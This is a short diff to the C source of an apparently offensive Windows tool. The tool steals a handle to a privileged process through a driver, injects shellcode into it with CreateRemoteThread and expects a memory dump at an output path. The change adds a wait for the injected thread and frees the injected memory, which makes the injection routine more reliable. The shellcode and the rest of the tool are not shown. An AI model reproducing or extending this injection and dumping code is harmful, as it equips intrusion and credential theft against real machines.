@@ -22,7 +22,7 @@ int main(int argc, char **argv)
 {
   DWORD pid, opid, sclen;
   PCHAR pname, outpath;
-  HANDLE hDriver, privHandle;
+  HANDLE hDriver, privHandle, hThread;
   LPVOID pMemory, pStrMem;
 
   while ( (argc > 1) && (argv[1][0] == '-') )
@@ -105,7 +105,7 @@ int main(int argc, char **argv)
 				NULL
 			  );
 
-			  CreateRemoteThread(
+			  hThread = CreateRemoteThread(
 				privHandle,
 				NULL,
 				0,
@@ -116,6 +116,15 @@ int main(int argc, char **argv)
 			  );
 
 			  printf("[+] injected %i bytes of shellcode into %s\n", sizeof(buf), pname);
+
+			  WaitForSingleObject(hThread, INFINITE);
+
+			  printf("[+] thread stopped successfully, should have a dump @ %s\n",
+					  outpath);
+
+			  VirtualFree(pMemory, 0, MEM_RELEASE);
+			  VirtualFree(pStrMem, 0, MEM_RELEASE);
+
 		  } else { 
 			  printf("[ ] failed to steal handle to %s\n",
 					  pname);
